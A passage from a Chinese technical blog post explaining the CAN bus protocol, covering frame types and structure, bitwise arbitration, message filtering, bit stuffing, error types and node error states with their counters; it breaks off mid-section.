src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/OSI%E5%9F%BA%E6%9C%AC%E5%8F%82%E7%85%A7%E6%A8%A1%E5%9E%8B.png" class=""><h3 id="3-2-CAN协议网络层次"><a href="#3-2-CAN协议网络层次" class="headerlink" title="3.2 CAN协议网络层次"></a>3.2 CAN协议网络层次</h3><p>在CAN协议中，ISO标准只对数据链路层和物理层做了规定。对于数据链路层和物理层的一部分，ISO11898和ISO11519-2的规定是相同，但是在物理层的PMD子层和MDI子层是不同的。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CAN%E5%8D%8F%E8%AE%AE%E7%BD%91%E7%BB%9C%E5%B1%82%E6%AC%A1.png" class=""><p>在CAN总线，每一层网络中定义的事项如下：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E6%AF%8F%E4%B8%80%E5%B1%82%E7%BD%91%E7%BB%9C%E4%B8%AD%E5%AE%9A%E4%B9%89.png" class=""><h2 id="四、CAN通信网络结构"><a href="#四、CAN通信网络结构" class="headerlink" title="四、CAN通信网络结构"></a>四、CAN通信网络结构</h2><h3 id="4-1-总线"><a href="#4-1-总线" class="headerlink" title="4.1 总线"></a>4.1 总线</h3><p>CAN总线是<strong>广播</strong>类型的总线，意味着</p><ol><li>所有节点都可以<strong>侦听</strong>到所有传输，无法向一个特定的节点发送报文。</li><li>所有节点都将始终接受所有通信。</li></ol><p>注： CAN硬件能够提供本地过滤功能，从而每个节点只可以对感兴趣的报文作出响应。</p><h3 id="4-2-CAN报文"><a href="#4-2-CAN报文" class="headerlink" title="4.2 CAN报文"></a>4.2 CAN报文</h3><p>CAN使用短报文—最大效用负载是94位，报文中没有明确地址；</p><p>相反，可以认为报文是通过内容寻址，也就是报文的内容隐式地确定地址。</p><h3 id="4-3-报文类型"><a href="#4-3-报文类型" class="headerlink" title="4.3 报文类型"></a>4.3 报文类型</h3><p>CAN总线上有四种不同报文类型(或帧)</p><h4 id="4-3-1-数据帧"><a href="#4-3-1-数据帧" class="headerlink" title="4.3.1 数据帧"></a>4.3.1 数据帧</h4><p>所谓数据帧，就是包含了我们所要传输的数据，其作用当然也就是承载发送节点要传递给接受节点的数据</p><p>数据帧 的帧结构如下图所示，包含七个段：<strong>帧起始、仲裁段、控制段、数据段、CRC段、ACK段、帧结束</strong>。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E6%95%B0%E6%8D%AE%E5%B8%A7.png" class=""><h4 id="4-3-2-远程帧-遥控帧"><a href="#4-3-2-远程帧-遥控帧" class="headerlink" title="4.3.2 远程帧/遥控帧"></a>4.3.2 远程帧/遥控帧</h4><p>遥控帧的作用可以描述为：请求其他节点发出与本遥控帧具有相同ID号的数据帧。</p><p>例：</p><p>在某一时刻，节点Node_A向总线发送了一个ID号为ID_2的遥控帧，那么意味着Node_A请求总线上的其他节点发送ID号为ID_2的数据帧。</p><p>节点Node_B能够发出ID号为ID_2的数据帧，那么Node_B就会在收到Node_A发出的遥控帧之后，立刻向总线上发送ID号为ID_2的数据帧。</p><p>遥控帧 相比于数据帧，从帧结构上来看，只是少了数据段，包含六个段：帧起始、仲裁段、控制段、CRC段、ACK段、帧结束。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E8%BF%9C%E7%A8%8B%E5%B8%A7.png" class=""><p>数据帧和遥控帧都分为标准帧（CAN2.0A）和扩展帧（CAN2.0B）两种结构。<br>遥控帧相比于数据帧除了缺少数据段之外，遥控帧的RTR位恒为隐性1，数据帧的RTR位恒为显性0。</p><p>CAN 2.0A，一个11位的标识符 和 一个支配数据帧 的RTR位。<br>CAN 2.0B，一个29位的标识符（其中还包括两个隐性位：SRR 和 IDE） 和 RTR 字段 —– 见扩展帧。</p><h3 id="4-4-帧结构"><a href="#4-4-帧结构" class="headerlink" title="4.4 帧结构"></a>4.4 帧结构</h3><h4 id="4-4-1-帧起始"><a href="#4-4-1-帧起始" class="headerlink" title="4.4.1 帧起始"></a>4.4.1 帧起始</h4><p>帧的最开始的一位是帧起始，也叫SOF（Start Of Frame），SOF恒为显性位，即逻辑 0 。<br>帧起始表示CAN_H 和 CAN_L上有了电位差，也就是说，一旦总线上有了SOF就表示总线上开始有报文了。</p><h4 id="4-4-2-仲裁段"><a href="#4-4-2-仲裁段" class="headerlink" title="4.4.2 仲裁段"></a>4.4.2 仲裁段</h4><p>仲裁段是用来判定一帧报文优先级的依据，仲裁段中的ID号也是实现报文过滤机制的基础。</p><p>仲裁段由以下几个部分组成，</p><p>数据帧仲裁段：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BB%B2%E8%A3%81%E6%AE%B5.png" class=""><p>遥控帧仲裁段：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E9%81%A5%E6%8E%A7%E5%B8%A7%E4%BB%B2%E8%A3%81%E6%AE%B5.png" class=""><p>可以看到相比于数据帧仲裁段RTR位恒为显性0，遥控帧仲裁段的RTR位恒为隐性1。</p><h5 id="4-4-2-1-仲裁过程"><a href="#4-4-2-1-仲裁过程" class="headerlink" title="4.4.2.1 仲裁过程"></a>4.4.2.1 仲裁过程</h5><p>在CAN总线通信中，有一种<strong>回读机制</strong>：<br>指的是节点在向总线上发送报文的过程中，同时也对总线上的二进制位进行“回读”。通过这种机制，节点就可以判断出本节点发出的二进制位与总线上当前的二进制位是否一致。</p><p>还有一种叫做<strong>线与机制</strong>：指的是在总线上，显性位能够覆盖隐性位。</p><p>举个例子：在某一个时刻，节点Node_A向总线发送了一个显性位0，Node_B向总线发送了一个隐性位1，那么在该时刻，总线上的电平为显性0。</p><p>下面将以标准数据帧的一个例子来分析CAN总线的非破坏性逐位仲裁机制。<br>一条CAN总线上有Node_A 和 Node_B两个节点，在总线空闲时，总线上为隐性电平，就在这个时候Node_A 和 Node_B 这两个节点同时向总线上发送数据，如下图：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BB%B2%E8%A3%81%E8%BF%87%E7%A8%8B.png" class=""><p>从图中可以看出，在Node_A 和 Node_B 传输数据前，总线处于空闲状态，为隐性电平1，<br>这也就意味着，此时总线上的任意节点都可以向总线发送数据。</p><p>在某一时刻，Node_A 和Node_B两个节点同时向总线上发送数据。按照线与机制，总线上的电位为：</p><table><thead><tr><th>节点/ID号</th><th>ID10</th><th>ID9</th><th>ID8</th><th>ID7</th><th>ID6</th><th>…</th></tr></thead><tbody><tr><td>Node_A</td><td>1</td><td>0</td><td>1</td><td>0</td><td>1</td><td>…</td></tr><tr><td>Node_B</td><td>1</td><td>0</td><td>1</td><td>1</td><td>…</td><td>…</td></tr><tr><td>总线</td><td>1</td><td>0</td><td>1</td><td>0</td><td>1</td><td>…</td></tr></tbody></table><p>在Node_A和Node_B两个节点向总线发送数据时，他们同时回读总线上的电平。<br>从图中我们可以看到，Node_A 和Node_B的ID10 、ID9、ID8电位相同，因此这两个节点从总线上听到的电位与他们自己发出的电位也相同，这个时候还没有分出胜负。</p><p>当Node_B回读总线上的 ID7 这一位时，发现总线上的电平跟它自己发送到总线上的不一样，此时，Node_B知道自己在争夺总线的仲裁中失败了，那么它主动地转换为接收状态，不再发出信息。</p><p>于是在此之后，总线上的电平和Node_A发出的电平一致，也就是说，Node_A占据了总线的发送权。<br>通过上面的分析我们可以看到，在整个仲裁过程中：</p><ol><li>在Node_A获取总线的发送权之后，Node_A接着发送自己的Msg_A，因此在竞争总线的过程中不会对Msg_A的传输造成延时；</li><li>在两个节点竞争总线的过程中，不会破坏Msg_A;</li></ol><p>正是由于上面的两点，才称之为<strong>非破坏性仲裁机制</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">Tips: 通过上面仲裁过程的分析，我们可以解释CAN总线通信的三个特点：<br><br><span class="hljs-number">1</span>）多主控制方式：只要总线空闲，总线上的任意节点都可以向总线上发送数据，<br>直到节点在仲裁中一个个失败，最后只留下一个节点获得总线的发送权。<br><br><span class="hljs-number">2</span>）非破坏性仲裁机制：仲裁段逐位总裁，依靠回读机制、线与机制得以实现。<br><br><span class="hljs-number">3</span>）半双工通信：所谓半双工通信，指的是节点不能在自己发送报文的时候，同时接收其他节点发送来的报文。<br>这是显然的，一个节点正在发送报文时，已经占据了总线的发送权，其他节点肯定不能向总线上发送报文。<br></code></pre></td></tr></table></figure><p>看一个CAN报文发送的实例，<br>CAN总线上有四个节点：Node_A、Node_B、Node_C、Node_D。<br>发送的报文的ID号分别为5、7、3、6.</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CAN%E6%8A%A5%E6%96%87%E5%8F%91%E9%80%81%E7%9A%84%E5%AE%9E%E4%BE%8B.png" class=""><h5 id="4-4-2-2-RTR，SRR-和-IDE位"><a href="#4-4-2-2-RTR，SRR-和-IDE位" class="headerlink" title="4.4.2.2 RTR，SRR 和 IDE位"></a>4.4.2.2 RTR，SRR 和 IDE位</h5><p>通过上面标准数据帧的仲裁过程分析，我们已经理解了CAN总线的仲裁机制。<br>但同时也注意到仲裁段除了ID号之外，还有其他的位。</p><h6 id="1）RTR位："><a href="#1）RTR位：" class="headerlink" title="1）RTR位："></a>1）RTR位：</h6><p>Tranmission Request Bit （远程发送请求位）。<strong>在数据帧中，RTR位恒为显性位0，在遥控帧中，恒为隐性1</strong>。</p><p>RTR位的作用：<strong>在ID号相同的情况下，保证数据帧的优先级高于遥控帧</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">Tips: 这么做的原因是保证数据帧优先级高于遥控帧。<br><br>比如：<br>在某一时刻t，节点Node_A发出了ID号为ID_2遥控帧报文来请求总线上的其它节点发出ID号为ID_2的数据帧报文。<br>但是就在同一时刻t，节点Node_B发出了ID号为ID_2的数据帧报文。<br><br>这个时候怎么办呢，显然依靠ID号不能仲裁出这两帧报文（一个遥控帧，一个数据帧，ID号相同）谁能占据总线的发送权，<br><br>这种情况下，RTR位就起作用了，由于RTR在数据帧中恒为显性<span class="hljs-number">0</span>，在遥控帧中恒为隐性<span class="hljs-number">1</span>，<br>所以在ID号相同的情况下，一定是数据帧仲裁获胜。<br><br>这就解释了 RTR位的作用：在ID号相同的情况下，保证数据帧的优先级高于遥控帧。<br></code></pre></td></tr></table></figure><h6 id="2）SRR位"><a href="#2）SRR位" class="headerlink" title="2）SRR位"></a>2）SRR位</h6><p>Substitutes for Remote Requests Bit（替代远程请求位），<br>在扩展帧（数据帧或遥控帧）中，SRR恒为隐性位1，并且可以发现，扩展帧的隐性SRR位正好对应标准帧的显性RTR位，<br>这就解释了 SRR位的作用：<strong>在前11位ID号相同的情况下，标准数据帧的优先级高于扩展数据帧；</strong></p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/SRR%E4%BD%8D.png" class=""><h6 id="3）IDE位"><a href="#3）IDE位" class="headerlink" title="3）IDE位"></a>3）IDE位</h6><p>全称：Identifier Extension Bit（标识符扩展位）。<br>在扩展帧中恒为隐性1，在标准帧中，IDE位于控制段，且恒为显性0。<br>且扩展帧IDE位和标准帧IDE位位置对应，<br>这就保证了： <strong>在前11位ID号相同的情况下，标准遥控帧的优先级一定高于扩展遥控帧。</strong></p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/IDE%E4%BD%8D.png" class=""><h6 id="4-总结："><a href="#4-总结：" class="headerlink" title="4) 总结："></a>4) 总结：</h6><p>在ID号前11位相同的情况下：</p><p>RTR：保证数据帧优先级高于遥控帧；<br>SRR ：保证标准数据帧的优先级高于扩展数据帧。<br>IDE ：保证标准遥控帧的优先级高于扩展遥控帧。</p><h5 id="4-4-2-3-报文过滤"><a href="#4-4-2-3-报文过滤" class="headerlink" title="4.4.2.3 报文过滤"></a>4.4.2.3 报文过滤</h5><p>在CAN总线中没有地址的概念，CAN总线是通过报文ID来实现收发数据的。<br>CAN节点上都会有一个验收滤波ID表，其位于CAN节点的验收滤波器中，<br>如果总线上的报文的ID号在某个节点的验收滤波ID表中，那么这一帧报文就能通过该节点验收滤波器的验收，该节点就会接收这一帧报文。</p><p>比如：Node_A发送了一帧ID号为ID_1的报文Msg_1，Node_B的验收滤波ID表中恰好有ID_1，于是乎Msg_1就会被Node_B接收。</p><p>Tips: 报文过滤机制体现了CAN通信的两条特点：<br>1）一对一、组播和广播<br>2）系统的柔性：正是因为CAN总线上收发报文是基于报文ID实现的，所以总线上添加节点时不会对总线上已有的节点造成影响。</p><h4 id="4-4-3-控制段"><a href="#4-4-3-控制段" class="headerlink" title="4.4.3 控制段"></a>4.4.3 控制段</h4><p>数据帧和遥控帧的控制段结构相同：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E6%8E%A7%E5%88%B6%E6%AE%B5.png" class=""><ol><li>标准帧中IDE位对应扩展帧中的IDE位，保证在前11位ID号相同的情况下，标准帧的优先级一定高于扩展帧；</li><li>然后是保留位r0和r1（扩展帧），保留位r0和r1必须以显性电平发送，但是接受方可以接受显性、隐性及其任意组合的电平；</li><li>最后是4个字节的DLC（DLC3、DLC2、DLC1、DLC0）代表数据长度，指示了数据段中的字节数。对于没有数据段的遥控帧，DLC表示该遥控帧对应的数据帧的数据段的字节数。</li></ol><h4 id="4-4-4-数据段"><a href="#4-4-4-数据段" class="headerlink" title="4.4.4 数据段"></a>4.4.4 数据段</h4><p>数据段可以包含 0~8 个字节的数据，从MSB（最高位）开始输出。</p><h4 id="4-4-5-CRC段"><a href="#4-4-5-CRC段" class="headerlink" title="4.4.5 CRC段"></a>4.4.5 CRC段</h4><p>CRC段包含CRC校验序列和CRC界定符。<br>CRC校验序列是根据多项式生成的CRC值，其计算范围包括：帧起始、仲裁段、控制段和数据段。<br>CRC界定符恒为隐性1。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CRC%E6%AE%B5.png" class=""><h4 id="4-4-6-ACK段"><a href="#4-4-6-ACK段" class="headerlink" title="4.4.6 ACK段"></a>4.4.6 ACK段</h4><p>ACK段包含ACK槽和ACK界定符两个位。</p><p>发送节点在ACK段发送两个隐性位，即发送方发出的报文中ACK槽为隐性1；<br>接收节点在接收到正确的报文之后会在ACK槽发送显性位0，通知发送节点正常接收结束。所谓接收到正确的报文指的是接收到的报文没有填充错误、格式错误、CRC错误。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/ACK%E6%AE%B5.png" class=""><p><strong>Tips:</strong><br>我们以标准数据帧为例来分析ACK段的工作方式：<br>如图所示，Node_A为发送节点，Node_B为接收节点。<br>Node_A在ACK段发送两个隐性位1。<br>Node_B正确接收到这一报文后，在ACK段的ACK槽中填充了一个显性位0。<br>注意，这个时候Node_A回读到的总线上的额电平为显性0，于是这个时候，Node_A就知道自己发出去的报文至少有一个节点正确接收了。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/ACK%E6%AE%B51.png" class=""><h4 id="4-4-7帧结束"><a href="#4-4-7帧结束" class="headerlink" title="4.4.7帧结束"></a>4.4.7帧结束</h4><p>帧结束段表示该帧报文的结束，由7个隐性位1 构成。</p><h4 id="4-4-8错误帧"><a href="#4-4-8错误帧" class="headerlink" title="4.4.8错误帧"></a>4.4.8错误帧</h4><h5 id="4-4-8-1错误帧的帧结构"><a href="#4-4-8-1错误帧的帧结构" class="headerlink" title="4.4.8.1错误帧的帧结构"></a>4.4.8.1错误帧的帧结构</h5><p>在发送和接收报文时，总线上的节点如果检测出了错误，那么该节点就会发送错误帧，通知总线上的节点，自己出错了。<br>错误帧由错误标志和错误界定符两个部分组成。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E9%94%99%E8%AF%AF%E5%B8%A7%E7%9A%84%E5%B8%A7%E7%BB%93%E6%9E%84.png" class=""><p>主动错误标志：6个连续的显性位 （0）；<br>被动错误标志：6个连续的隐性位 （1）；<br>错误界定符：8个连续的隐性位 （1）。</p><p>可以看到在错误标志之后还有0~6位的错误标志重叠，这一段最低有0个位，最多有6个位，关于这一段是怎么形成的，将在下文中解释。</p><h5 id="4-4-8-2-错误检测"><a href="#4-4-8-2-错误检测" class="headerlink" title="4.4.8.2 错误检测"></a>4.4.8.2 错误检测</h5><h6 id="4-4-8-2-1-位填充原则"><a href="#4-4-8-2-1-位填充原则" class="headerlink" title="4.4.8.2.1 位填充原则"></a>4.4.8.2.1 位填充原则</h6><p>在了解CAN总线中的错误检测之前，首先需要了解什么是位填充。<br>CAN协议中规定，<strong>当相同极性的电平持续五位时，则添加一个极性相反的位</strong>。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BD%8D%E5%A1%AB%E5%85%85%E5%8E%9F%E5%88%99.png" class=""><p><strong>对于发送节点而言：</strong><br>在发送数据帧和遥控帧时，对于 SOF~CRC(除去CRC界定符) 之间的位流，相同极性的电平如果持续5位，那么在下一个位插入一个与之前5位反型的电平；</p><p><strong>对于接收节点而言：</strong><br>在接收数据帧和遥控帧时，对于 SOF~CRC(除去CRC界定符) 之间的位流，相同极性的电平如果持续5位，那么需要删除下一位再接收。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E6%8E%A5%E6%94%B6%E8%8A%82%E7%82%B9.png" class=""><p>Tips: 注意：填充位的添加和删除是由发送节点和接收节点完成的，CAN-BUS只负责传输，不会操纵信号。</p><h5 id="4-4-8-3-错误的种类"><a href="#4-4-8-3-错误的种类" class="headerlink" title="4.4.8.3 错误的种类"></a>4.4.8.3 错误的种类</h5><p>在CAN总线通信中，一共有五种错误：<br>（1）位错误<br>（2）ACK错误<br>（3）填充错误<br>（4）CRC错误<br>（5）格式错误</p><h6 id="4-4-8-3-1-位错误"><a href="#4-4-8-3-1-位错误" class="headerlink" title="4.4.8.3.1 位错误"></a>4.4.8.3.1 位错误</h6><p>（Bit Check Error）</p><p>节点将自己发送到总线上的电平与同时从总线上回读到的电平进行比较，如果发现二者不一致，那么这个节点就会检测出一个位错误。</p><p>实际上所谓“发出的电平与从总线上回读的电平不一致”，指的就是节点向总线发出隐性位，却从总线上回读到显性位或者节点向总线发出显性位，却从总线上回读到隐性位这两种情况。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">Tips: 有三种例外情况不属于位错误：<br><br>在仲裁区，节点向总线发送隐性位却回读到显性位，不认为是位错误，这种情况表示该节点仲裁失败；<br><br>在ACK槽，节点向总线发送隐性位却回读到显性位，不认为是位错误，这种情况表示，该节点当前发送的这一帧报文至少被一个其它节点正确接收；<br><br>该节点发送被动错误标志，节点Node_A向总线发送连续六个隐性位（被动错误标志）却回读到显性位，不认为是位错误。因为被动错误标志是六个连续的隐性位，所以在总线上按照线与机制，有可能这六个连续隐性位被其它节点发送的显性电平“吃掉”<br></code></pre></td></tr></table></figure><h6 id="4-4-8-3-2-ACK错误"><a href="#4-4-8-3-2-ACK错误" class="headerlink" title="4.4.8.3.2 ACK错误"></a>4.4.8.3.2 ACK错误</h6><p>（Acknowledgment Error）</p><p>按照CAN协议的规定，在一帧报文（数据帧或者遥控帧）发出之后，如果接收节点Node_B成功接收了该帧报文，那么接收节点Node_B就要在该帧报文ACK槽对应的时间段内向总线上发送一个显性位来应答发送节点Node_A。这样发送节点Node_A就会在ACK槽时间段内从总线上回读到一个显性位。</p><p>因此：<br>当发送节点Node_A在ACK槽时间段内没有回读到显性位，那么发送节点Node_A就会检测到一个ACK应答错误。这表示没有一个节点成功接收该帧报文。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/ACK%E9%94%99%E8%AF%AF.png" class=""><h6 id="4-4-8-3-3-填充错误"><a href="#4-4-8-3-3-填充错误" class="headerlink" title="4.4.8.3.3 填充错误"></a>4.4.8.3.3 填充错误</h6><p>（Fill Error）</p><p>在需要执行位填充原则的帧段（数据帧遥控帧的SOF~CRC序列），检测到连续六个同性位，则检测到一个填充错误。</p><h6 id="4-4-8-3-4-CRC错误"><a href="#4-4-8-3-4-CRC错误" class="headerlink" title="4.4.8.3.4 CRC错误"></a>4.4.8.3.4 CRC错误</h6><p>发送节点Node_A在发送数据帧或者遥控帧时，会计算出该帧报文的CRC序列。<br>接收节点Node_B在接收报文时也会执行相同的CRC算法，如果接收节点Node_B计算出的CRC序列值与发送节点Node_A发来的CRC序列值不一致，那么接收节点就检测到一个CRC错误。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CRC%E9%94%99%E8%AF%AF.png" class=""><h6 id="4-4-8-3-5-格式错误"><a href="#4-4-8-3-5-格式错误" class="headerlink" title="4.4.8.3.5 格式错误"></a>4.4.8.3.5 格式错误</h6><p>在一帧报文发送时，如果在必须发送预定值的区域内检测到了非法值，那么就检测到一个格式错误。<br>CAN报文中，有预定值的区域包括：</p><p>数据帧和遥控帧的CRC界定符、ACK界定符、EOF；<br>错误帧界定符<br>过载帧界定符</p><h6 id="4-4-8-3-6-错误通知"><a href="#4-4-8-3-6-错误通知" class="headerlink" title="4.4.8.3.6 错误通知"></a>4.4.8.3.6 错误通知</h6><p>上一节中，讲到CAN通信中有五种错误，并且介绍了在什么情况下能够检测到这几种错误，在检测到错误之后，检测到错误的节点就要发送错误帧到总线上来通知总线上的其他节点。</p><p>错误帧有的带有主动错误标志，有的带有被动错误标志，而且错误标志重叠部分的字节数也不一样，那么问题就来了：<br>什么情况下发送带有主动错误标志的错误帧；<br>什么情况下发送带有被动错误标志的错误帧；<br>在哪个时间点发送错误帧；<br>错误标志重叠部分是怎样形成的；</p><h6 id="4-4-8-3-7-节点错误状态"><a href="#4-4-8-3-7-节点错误状态" class="headerlink" title="4.4.8.3.7 节点错误状态"></a>4.4.8.3.7 节点错误状态</h6><p>按照CAN协议的规定，CAN总线上的节点始终处于以下三种状态之一。<br>a. 主动错误状态<br>b. 被动错误状态<br>c. 总关闭状态</p><p>当满足一定的条件时，节点可以从一种状态转换为另外一种状态。</p><p>Tips: 需要注意的是：<br>处于主动错误状态，表示该节点具备发出主动错误标志的能力;<br>处于被动错误状态，表示节点具备发出被动错误标志的能力。</p><p><strong>1）主动错误状态</strong></p><p>节点处于主动错误状态可以正常通信；<br>处于主动错误状态的节点（可能是接收节点也可能是发送节点）在检测出错误时，发出主动错误标志。</p><p><strong>2）被动错误状态</strong></p><p>节点处于被动错误状态可以正常通信；<br>处于被动错误状态的节点（可能是接收节点也可能是发送节点）在检测出错误时，发出被动错误标志。</p><p>Tips: 注意：这里说处于主动错误状态或被动错误状态的节点仍然可以正常通信，<br>这里的正常通信指的是：节点仍然能够从总线上接收报文，也能够竞争总线获胜后向总线上发送报文。<br>但是不代表接收的报文一定正确也不代表一定能正确的发送报文。</p><p><strong>3）总线关闭状态</strong><br>节点处于总线关闭状态，那么该节点不能收发报文；<br>处于总线关闭状态的节点，只能一直等待，在满足一定条件的时候，再次进入到主动错误状态</p><h6 id="4-4-8-3-8-错误状态的转换"><a href="#4-4-8-3-8-错误状态的转换" class="headerlink" title="4.4.8.3.8 错误状态的转换"></a>4.4.8.3.8 错误状态的转换</h6><p>现在我们知道：<br>处于主动错误状态的节点在检测到错误时会发送带有主动错误标志的错误帧；<br>处于被动错误状态的节点在检测到错误时会发送带有被动错误标志的错误帧。</p><p>那么一个CAN节点在什么情况下处于主动错误状态，什么情况下处于被动错误状态呢？</p><p>根据CAN协议的规定，在CAN节点内，有两个计数器：<strong>发送错误计数器（TEC）</strong> 和 <strong>接收错误计数器（REC）</strong>。</p><p>Tips: 需要注意的是：<br>这两个计数器计得不是收发报文的数量，也不是收发错误帧的数量。<br>TEC和RCE计数值的变化，是根据下表的规定来进行的</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/TEC%E5%92%8CRCE%E8%AE%A1%E6%95%B0%E5%80%BC.png" class=""><p>CAN节点错误状态的转换，就是基于这两个计数器来进行的。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CAN%E8%8A%82%E7%82%B9%E9%94%99%E8%AF%AF%E7%8A%B6%E6%80%81%E7%9A%84%E8%BD%AC%E6%8D%A2.png" class=""><p>可以看出，节点错误状态的转换就是一个 “量变” 到“质变”的过程：</p><p><strong>1) 主动错误状态</strong><br>最开始TCE和REC都小于127时**，就处于主动错误状态。</p><p>在这一状态下，节点检测到一个错误就会发送带有主动错误标志的错误帧，<br>因为主动错误标志是连续六个显性位，所以这个时候主动错误标志将会“覆盖”掉总线上其它节点的发送，<br>而之前在CAN总线上传输的报文就被这“六个连续显性位”破坏掉了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">如果发出主动错误帧的节点是发送节点，这个情况下就相当于：<br>刚刚发送的那一帧报文我发错了，现在我破坏掉它（发送主动错误帧），你们不管收到什么都不算数；<br><br>如果发出主动错误帧的节点是接收节点，这个情况就相当于：<br>刚刚我收报文的时候发现了错误，不管你们有没有发现这个错误，<br>我现在主动站出来告诉大家这个错误，并把这一帧报文破坏掉（发送主动错误帧），<br>刚才你们收到的东西不管对错都不算数了。<br><br><br>Tips: 处于主动错误状态，说明这个节点目前是比较可靠的，出现错误的原因可能不是它本身的问题，<br>即刚刚检测到的错误可能不仅仅只有它自己遇到，正是因为这一点，<br>整个总线才相信它报告的错误，允许它破坏掉发送中的报文，也就是将这一次的发送作废。<br></code></pre></td></tr></table></figure><p><strong>2）被动错误状态</strong><br>如果某个节点发送错误帧的次数较多，必将使得TCE＞127 或者 REC＞127，那么该节点就处于被动错误状态。</p><p>在这一状态下，节点Node_A检测到一个错误就会发送带有被动错误标志的错误帧，因为被动错误标志是连续六个隐性位，所以这个时候总线上正在传输的报文位流不会受到该被动错误帧的影响，其它的节点该发送的发送，该接收的接收，没人搭理这个发送被动错误帧的节点Node_A。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">如果发出被动错误帧的节点Node_A为报文的发送节点，<br>那么在发送被动错误帧之后，刚刚正在发送的报文被破坏，<br>并且Node_A不能在错误帧之后随着连续发送刚刚发送失败的那个报文。<br><br>随之而来的是帧间隔，并且连带着<span class="hljs-number">8</span>位隐性位的 “延迟传送” 段；<br><br>这样总线电平就呈现出连续<span class="hljs-number">11</span>位隐性位，总线上的其它节点就能判定总线处于空闲状态，就能参与总线竞争。<br><br>此时如果Node_A能够竞争成功，那么它就能接着发送，如果竞争不能成功，那么就接着等待下一次竞争。<br>这种机制的目的正是为了让其它正常节点（处于主动错误）优先使用总线。<br><br><br>Tips: 